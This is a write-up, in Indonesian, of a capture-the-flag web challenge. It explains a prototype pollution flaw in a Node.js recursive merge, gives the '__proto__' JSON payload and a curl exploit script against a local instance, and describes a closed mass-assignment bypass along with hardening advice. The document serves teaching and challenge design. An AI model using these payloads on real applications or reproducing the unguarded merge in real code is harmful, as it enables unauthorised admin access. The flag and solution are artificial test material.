# Write-up dan Evaluasi Celah - Report Vault

## Ringkasan

Report Vault adalah challenge web Node.js/Express yang menyimpan state user di session. Akun awal adalah `guest`, sedangkan endpoint `/reports/private` hanya menampilkan flag jika user dianggap memiliki akses admin export.

Flag dapat diperoleh dengan mengubah hasil pengecekan berikut:

```js
user.role === "admin" && user.canExportPrivate === true
```

Jalur eksploit intended adalah **prototype pollution** melalui recursive merge pada `/api/preferences`.

## Analisis Source

User default dibuat sebagai guest:

```js
req.session.user = {
  username: "guest",
  reportAccess: "public",
  preferences: {
    theme: "light",
    exportFormat: "pdf",
  },
};
```

Private report hanya boleh dibuka jika `isAdmin()` bernilai true:

```js
function isAdmin(user) {
  return user.role === "admin" && user.canExportPrivate === true;
}
```

Masalah utamanya berada di endpoint preference:

```js
app.post("/api/preferences", (req, res) => {
  if (
    !req.body ||
    typeof req.body !== "object" ||
    Array.isArray(req.body) ||
    !req.body.preferences ||
    typeof req.body.preferences !== "object" ||
    Array.isArray(req.body.preferences)
  ) {
    return res.status(400).json({ error: "preferences object required" });
  }

  mergeDeep(req.session.user.preferences, req.body.preferences);
  res.json({ ok: true, user: req.session.user });
});
```

Endpoint ini hanya menerima object `preferences`, tetapi recursive merge di dalamnya tetap memproses nested key yang dikirim peserta.

## Jalur Intended: Prototype Pollution

Fungsi `mergeDeep()` melakukan recursive merge tanpa memblokir key berbahaya:

```js
function mergeDeep(target, source) {
  for (const key of Object.keys(source)) {
    const value = source[key];
    if (value && typeof value === "object" && !Array.isArray(value)) {
      if (!target[key]) {
        target[key] = {};
      }
      mergeDeep(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

Payload JSON dengan key `__proto__` akan diproses sebagai own property dari hasil parsing JSON. Saat kode membaca `target["__proto__"]`, JavaScript mengakses prototype object, yaitu `Object.prototype`. Recursive merge kemudian menulis `role` dan `canExportPrivate` ke prototype global tersebut.

Payload:

```json
{"preferences":{"__proto__":{"role":"admin","canExportPrivate":true}}}
```

Setelah pollution, `req.session.user.role` dan `req.session.user.canExportPrivate` bisa terbaca dari prototype chain. Karena `isAdmin()` tidak memastikan property tersebut adalah own property milik user, pengecekan admin berhasil.

Eksploit:

```bash
BASE_URL="http://127.0.0.1:8003"
JAR="$(mktemp)"

curl -s -c "$JAR" "$BASE_URL/" >/dev/null
curl -s -b "$JAR" -c "$JAR" \
  -H 'content-type: application/json' \
  -d '{"preferences":{"__proto__":{"role":"admin","canExportPrivate":true}}}' \
  "$BASE_URL/api/preferences" >/dev/null
curl -s -b "$JAR" "$BASE_URL/reports/private"
```

Output private report akan memuat:

```text
Quarterly confidential report
status=approved
flag=Olivia26{report_vault_polluted_access}
```

## Evaluasi Celah yang Ditutup

Versi awal challenge juga punya bypass mass assignment yang lebih sederhana:

```json
{"role":"admin","canExportPrivate":true}
```

Jika server memanggil `mergeDeep(req.session.user, req.body)`, field top-level dari request langsung ditambahkan sebagai property user session. Setelah request ini, user session memiliki own property:

```js
{
  username: "guest",
  reportAccess: "public",
  preferences: { ... },
  role: "admin",
  canExportPrivate: true
}
```

Jalur ini tidak membutuhkan prototype pollution, sehingga tingkat kesulitan challenge turun jauh dari niat awal. Perbaikan yang diterapkan adalah hanya menerima `req.body.preferences` lalu merge ke `req.session.user.preferences`, bukan ke seluruh object user.

Payload mass assignment sekarang ditolak karena tidak memiliki object `preferences`:

```json
{"error":"preferences object required"}
```

## Dampak

- Attacker dapat membuka `/reports/private` dan membaca flag tanpa kredensial admin.
- Prototype pollution mencemari `Object.prototype`, sehingga efeknya bisa lintas request dan lintas session selama proses Node.js yang sama masih hidup.
- Jika challenge berjalan dengan banyak peserta di satu instance, satu exploit prototype pollution dapat membuat object lain ikut memiliki property admin.
- Jalur mass assignment sudah ditutup agar challenge tetap fokus pada prototype pollution.

## Akar Masalah

- Recursive merge menerima input tidak tepercaya tanpa denylist untuk key seperti `__proto__`, `constructor`, dan `prototype`.
- Endpoint preference tetap memproses nested key berbahaya di dalam `preferences`.
- Authorization mempercayai property lookup biasa, sehingga inherited property dari prototype chain ikut dianggap valid.

## Rekomendasi Perbaikan

Perbaikan challenge untuk mempertahankan intended vulnerability prototype pollution adalah menutup jalur mass assignment:

```js
app.post("/api/preferences", (req, res) => {
  if (
    !req.body ||
    typeof req.body !== "object" ||
    Array.isArray(req.body) ||
    !req.body.preferences ||
    typeof req.body.preferences !== "object" ||
    Array.isArray(req.body.preferences)
  ) {
    return res.status(400).json({ error: "preferences object required" });
  }

  mergeDeep(req.session.user.preferences, req.body.preferences);
  res.json({ ok: true, user: req.session.user });
});
```

Untuk patch produksi yang benar, lakukan semua hardening berikut:

- Tolak key `__proto__`, `constructor`, dan `prototype` secara rekursif sebelum merge.
- Gunakan whitelist field preference, misalnya hanya `theme` dan `exportFormat`.
- Jangan merge input user ke object yang menyimpan authorization state.
- Validasi admin dengan state server-side yang tidak bisa dikontrol client.
- Jika tetap perlu memeriksa property sensitif, gunakan own-property check seperti `Object.hasOwn(user, "role")`.
- Simpan session secret dari environment variable dan aktifkan cookie hardening yang sesuai deployment.

## Kesimpulan

Jalur flag intended adalah prototype pollution:

```json
{"preferences":{"__proto__":{"role":"admin","canExportPrivate":true}}}
```

Poin challenge dinaikkan dari 300 menjadi 400, dan hint peserta dibuat lebih subtle tanpa menyebut payload `__proto__` secara langsung.
